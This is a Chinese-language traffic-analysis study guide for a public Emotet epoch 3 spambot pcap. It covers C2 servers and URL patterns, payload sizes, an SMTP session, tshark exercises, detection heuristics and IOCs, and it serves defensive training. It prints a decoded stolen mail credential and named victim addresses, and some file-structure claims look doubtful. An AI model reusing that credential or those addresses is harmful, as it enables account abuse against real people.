# Emotet Epoch 3 感染 + Spambot 流量分析学习手册

> **pcap 文件**：`2019-11-27-Emotet-epoch-3-infected-Windows-client-as-spambot.pcap`
> **来源**：Malware-Traffic-Analysis.net
> **捕获时长**：约 361 秒（~6 分钟）
> **学习目标**：理解 Emotet 僵尸网络的 C2 通信模式、spambot 行为及流量分析方法

---

## 1. 环境概览

### 1.1 网络拓扑

通过 pcap 分析得到的内网环境：

| 项目 | 值 | 识别方法 |
|------|-----|---------|
| **受害主机 IP** | `10.11.27.102` | 唯一与 C2 服务器通信的内网 IP |
| **DNS/网关** | `10.11.27.1` | DNS 查询目标地址；ARP 流量 |
| **网段** | `10.11.27.0/24` | 所有内网 IP 在此范围 |

### 1.2 受害主机特征

| 属性 | 值 | 识别方法 |
|------|-----|---------|
| IP 地址 | `10.11.27.102` | C2 过滤 `ip.addr==82.145.43.153` |
| OS 指纹 | Windows NT 6.1 (Windows 7 / Server 2008 R2) | HTTP User-Agent 头 |
| 角色 | 工作站 / 被控 spambot | SMTP 出站流量 |

---

## 2. Wireshark 过滤表达式速查

本章节涉及的所有关键过滤表达式：

```wireshark
# === Emotet C2 HTTP 流量 ===
ip.addr == 82.145.43.153 || ip.addr == 92.119.123.10 || ip.addr == 222.239.249.166

# 仅 HTTP 请求（出站）
http.request && (ip.dst == 82.145.43.153 || ip.dst == 92.119.123.10 || ip.dst == 222.239.249.166)

# === SMTP Spambot 流量 ===
smtp

# SMTP 命令（EHLO/AUTH/MAIL/RCPT/DATA）
smtp.req.command

# 查看邮件发件人/收件人
smtp.req.parameter contains "@"

# SMTP 认证凭据
smtp.req.parameter contains "AUTH"

# === DNS 查询（分辨 C2 和 SMTP） ===
dns.flags.response == 0

# 查询 SMTP 服务器
dns.qry.name contains "smtp" || dns.qry.name contains "mail" || dns.qry.name contains "pop"

# === TLS/SSL 加密连接 ===
tls.handshake.type == 1

# === HTTP 响应与载荷 ===
http.response
```

---

## 3. 感染链分析

### 3.1 感染流程概要

```
[初始感染 - 不在本 pcap 范围内]
        ↓
  Emotet epoch 3 DLL 加载
        ↓
  建立 HTTP C2 通道 (端口 8080 / 443)
        ↓
  下载 spam 模块 (3.3 MB DLL payload)
        ↓
  开始 Spambot 活动
        ↓
  连接 177+ 个 SMTP 服务器
        ↓
  发送含 .docx 恶意附件的钓鱼邮件
```

> ⚠️ 本 pcap 仅捕获了**已感染后**的流量，初始感染向量（钓鱼邮件宏或漏洞利用套件）不在此文件中。

### 3.2 时间线

从流量统计可以看到明显的**两阶段行为**：

| 时间窗口 | 流量特征 | 行为 |
|----------|---------|------|
| 0s – 60s | C2 HTTP + SMTP 混合 | Emotet C2 信令 + 开始 SMTP 扫描 |
| 60s – 120s | HTTP 大流量峰值 | 下载 spam 模块（3.3 MB payload） |
| 120s – 360s | 持续 SMTP 流量 | 大规模 spambot 活动 |

---

## 4. Emotet C2 通信分析

### 4.1 C2 服务器列表

| C2 服务器 | 端口 | 协议 | URL 路径示例 |
|-----------|------|------|-------------|
| `82.145.43.153` | 8080 | HTTP | `/forced/site/arizona/merge/` |
| `92.119.123.10` | 8080 | HTTP | `/enable/scripts/arizona/merge/` |
| `222.239.249.166` | 443 | HTTP | `/sFZSdbM0xoXf` |

### 4.2 HTTP 请求特征

```
GET /forced/site/arizona/merge/ HTTP/1.1
Host: 82.145.43.153:8080
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; ...)
```

**关键特征：**
- **路径中的 `arizona`** — Emotet epoch 3 的 campaign/botnet 标识标签
- **User-Agent** — 冒充 IE7 / Windows 7，典型的 Emotet UA
- **大量 URL 路径** — 每个请求不同的随机路径，规避基于签名的检测：

| 请求路径 | C2 服务器 |
|----------|-----------|
| `/forced/site/arizona/merge/` | 82.145.43.153:8080 |
| `/prep/forced/arizona/` | 82.145.43.153:8080 |
| `/entries/chunk/arizona/merge/` | 82.145.43.153:8080 |
| `/stubs/cab/arizona/` | 82.145.43.153:8080 |
| `/enable/scripts/arizona/merge/` | 92.119.123.10:8080 |
| `/usbccid/guids/arizona/merge/` | 92.119.123.10:8080 |
| `/results/` | 92.119.123.10:8080 |
| `/cookies/iplk/` | 92.119.123.10:8080 |
| `/enabled/walk/arizona/` | 92.119.123.10:8080 |
| `/sFZSdbM0xoXf` | 222.239.249.166:443 |
| `/siEPuoNA` | 222.239.249.166:443 |

### 4.3 C2 响应与 Payload 下载

HTTP 响应状态均为 `200 OK`，Content-Type 伪装为 `text/html; charset=UTF-8`，但实际是加密的二进制 payload。

| 响应帧 | 源 IP | 大小 | 用途推测 |
|--------|-------|------|---------|
| #8526 | 82.145.43.153 | 339,684 bytes | Emotet 核心 DLL 或配置 |
| #10856 | 82.145.43.153 | 339,684 bytes | 同上（重试/冗余） |
| #13092 | 92.119.123.10 | 171,028 bytes | 模块加载 |
| #15313 | 92.119.123.10 | 171,156 bytes | 模块加载 |
| #17826 | 92.119.123.10 | 170,996 bytes | 模块加载 |
| **#24253** | 92.119.123.10 | **3,380,884 bytes** | 🚨 **Spam 模块** |
| **#34942** | 92.119.123.10 | **2,198,580 bytes** | 🚨 **Spam 模块或载荷** |

> 💡 **学习要点**：3.3 MB 的大载荷是关键标志——Emotet 在下载 spam 模块前只传输小型加密配置，一旦开始下载 MB 级 payload，意味着主机即将进入 spambot 模式。

### 4.4 端口 443 的特殊 C2

`222.239.249.166:443` 虽然是 HTTPS 端口，但实际上传输的是 **HTTP over raw TCP**（非 TLS），路径为随机字符串（`/sFZSdbM0xoXf`、`/siEPuoNA`），这是 Emotet epoch 3 的典型特征。

---

## 5. Spambot 行为深度分析

### 5.1 总体统计

| 指标 | 数值 |
|------|------|
| 连接的 SMTP 服务器 | **177 个** 唯一目标 |
| SMTP 帧总数 | 1,812 帧 |
| SMTP 命令总数 | 522 条 |
| TLS 加密连接数 | 374 次 Client Hello |
| 发送端口 | 25 (SMTP)、465 (SMTPS)、587 (Submission) |

### 5.2 SMTP 连接模式

受害主机**同时并行**连接多个 SMTP 服务器，而非逐个串行——这表明 Emotet 使用多线程/异步 I/O 发送垃圾邮件。

**连接的 SMTP 服务器示例：**

```
smtpout.secureserver.net     →   7 次查询
smtp.live.com                →   6 次查询
smtp.mail.yahoo.com          →   5 次查询
smtp.gmail.com               →   3 次查询
smtp.zoho.com                →   2 次查询
smtp.yandex.ru               →   2 次查询
smtp.mail.ru                 →   2 次查询
outlook.office365.com        →   2 次查询
...
（共 304 个不同的 SMTP 域名查询）
```

### 5.3 SMTP 会话过程（详细拆解）

以 `154.72.196.227`（mail.uhrc.ug）为例：

```
# 阶段 1: TCP 三次握手
C → S: [SYN]  Seq=0
S → C: [SYN, ACK]
C → S: [ACK]

# 阶段 2: SMTP 握手
S: 220 mail.uhrc.ug ESMTP Postfix
C: EHLO [10.0.0.121]                         ← 伪造的 HELO 主机名
S: 250-mail.uhrc.ug
   250-SIZE
   250-VRFY
   250-ETRN
   250-AUTH PLAIN LOGIN
   250-8BITMIME
   250-DSN

# 阶段 3: 认证（使用被盗凭据）
C: AUTH PLAIN AHVocmNqaW5qYUB1aHJjLnVnAHQzc3RAMTIzNA==
   → 解码后: \0uhrcjinja@uhrc.ug\0t3st@1234
S: 235 2.7.0 Authentication successful

# 阶段 4: 发送邮件
C: MAIL FROM: <uhrcjinja@uhrc.ug>
S: 250 2.1.0 Ok
C: RCPT TO: <overseahtl_payment@trip.com>
S: 250 2.1.5 Ok
C: DATA
S: 354 End data with <CR><LF>.<CR><LF>
C: [MIME 邮件内容，包含 .docx 附件]
C: .
S: 250 Queued id=0x2001cf67
C: QUIT
```

### 5.4 被盗邮件凭据

通过 base64 解码 AUTH PLAIN 获取：

```
Uhrc.ug 邮件账户
├── 用户名: uhrcjinja@uhrc.ug
└── 密码:   t3st@1234
```

> ⚠️ Emotet 通过信息窃取模块（如之前从浏览器和邮件客户端偷取的凭据）来获得这些 SMTP 登录凭证。

### 5.5 垃圾邮件内容

邮件包含 **.docx 恶意附件**（Emotet 的经典传播方式）：

```
From:    uhrcjinja@uhrc.ug
To:      overseahtl_payment@trip.com
Subject: (推测) 发票 / 付款相关

附件结构（base64 解码后显示为 Open XML 格式）：
├── [Content_Types].xml
├── _rels/.rels
├── theme/theme/theme1.xml     ← 包含恶意宏的 Word 文档
├── theme/theme/_rels/themeManager.xml.rels
└── ...
```

使用的其他 FROM/TO 地址：

| 类型 | 地址 |
|------|------|
| FROM (伪造发件人) | `anjelo.femi@in.cpm-int.com` |
| FROM (伪造发件人) | `b.hussin@brj-sy.com` |
| FROM (被盗账户) | `uhrcjinja@uhrc.ug` |
| TO (攻击目标) | `overseahtl_payment@trip.com` |
| TO (攻击目标) | `importaciones@dismaconcobre.com` |
| TO (攻击目标) | `victorvila@pereventura.com` |

---

## 6. 实战练习

### 练习 1：定位 C2 通信

使用 tshark 查找所有与 Emotet C2 的 HTTP 通信：

```bash
# 列出所有 HTTP 请求
tshark -r pcap.pcap -Y "http.request" -T fields \
  -e frame.number -e ip.dst -e tcp.dstport -e http.request.uri

# 查找 emotet 特有的路径模式
tshark -r pcap.pcap -Y "http.request.uri contains \"/arizona/\"" \
  -T fields -e frame.number -e ip.src -e ip.dst
```

**问题**：有多少个不同的 C2 服务器？每个的 URL 路径模式是什么？

### 练习 2：分析 SMTP spambot

```bash
# 列出所有 SMTP 命令
tshark -r pcap.pcap -Y "smtp.req.command" \
  -T fields -e frame.number -e ip.dst -e smtp.req.command

# 提取认证凭据
tshark -r pcap.pcap -Y "smtp.req.parameter contains \"AUTH PLAIN\"" \
  -T fields -e smtp.req.parameter

# 查看邮件的发件人和收件人
tshark -r pcap.pcap -Y "smtp.req.parameter contains \"@\"" \
  -T fields -e smtp.req.parameter
```

**问题**：
1. 受害主机连接了多少个不同 SMTP 服务器？
2. 解码 AUTH PLAIN base64，获取被盗凭据
3. 邮件试图发送什么类型的附件？

### 练习 3：时间序列分析

```bash
# 统计每秒的流量
tshark -r pcap.pcap -q -z io,stat,1

# 分别统计 HTTP C2 和 SMTP 的流量
tshark -r pcap.pcap -q -z io,stat,1,"http","smtp"
```

**问题**：Payload 下载和 spambot 活动在时间上有什么先后关系？

### 练习 4：追踪攻击者足迹

```bash
# 追踪完整的 TCP 会话
tshark -r pcap.pcap -z follow,tcp,ascii,0

# 查看全部分析结果
tshark -r pcap.pcap -q -z conv,tcp
```

**问题**：受害者与多少个不同目标建立了 TCP 连接？哪些是 C2，哪些是 SMTP？

---

## 7. 检测规则（Sigma / Snort 思路）

### 7.1 HTTP C2 检测

```
HTTP Request 中：
  - URI 包含 "arizona" 和 "/merge/"
  - 或 URI 为随机 12 位字母数字路径（如 /sFZSdbM0xoXf）
  - User-Agent: Mozilla/4.0...MSIE 7.0...Windows NT 6.1
  - 目标端口 8080 或 443（但无 TLS 握手）
```

### 7.2 Spambot 行为检测

```
同一源 IP 在短时间内：
  - DNS 查询 >50 个不同 SMTP 域名
  - 建立 >20 个到不同 SMTP 服务器(25/465/587)的 TCP 连接
  - 使用 AUTH PLAIN 认证
  - EHLO 宣称的主机名不可达（如 [10.0.0.121]）
```

---

## 8. IOC 汇总

### 网络 IOC

| 类型 | 值 |
|------|-----|
| C2 IP | `82.145.43.153:8080` |
| C2 IP | `92.119.123.10:8080` |
| C2 IP | `222.239.249.166:443` |
| 受害 IP | `10.11.27.102` |
| DNS/网关 | `10.11.27.1` |
| 伪造 HELO | `[10.0.0.121]` |

### 邮件 IOC

| 类型 | 值 |
|------|-----|
| 被盗账户 | `uhrcjinja@uhrc.ug` |
| 被盗密码 | `t3st@1234` |
| 恶意附件 | `.docx` (含 Emotet 宏) |

### 行为 IOC

- 访问路径含 `arizona` 关键词的 HTTP 请求
- 批量 DNS 查询 SMTP 域名
- 并行 SMTP 连接至不同目标
- 大体积 HTTP 响应（>1 MB）标记为 text/html

---

## 9. 参考资源

- [Malware-Traffic-Analysis.net](https://www.malware-traffic-analysis.net/)
- [Emotet 分析 — Unit42](https://unit42.paloaltonetworks.com/tag/emotet/)
- Wireshark 教程系列（本网站）：
  - [Display Filter Expressions](https://unit42.paloaltonetworks.com/wireshark-tutorial-display-filter-expressions/)
  - [Identifying Hosts and Users](https://unit42.paloaltonetworks.com/wireshark-tutorial-identifying-hosts-and-users/)
  - [Exporting Objects from a Pcap](https://unit42.paloaltonetworks.com/wireshark-tutorial-exporting-objects-from-a-pcap/)
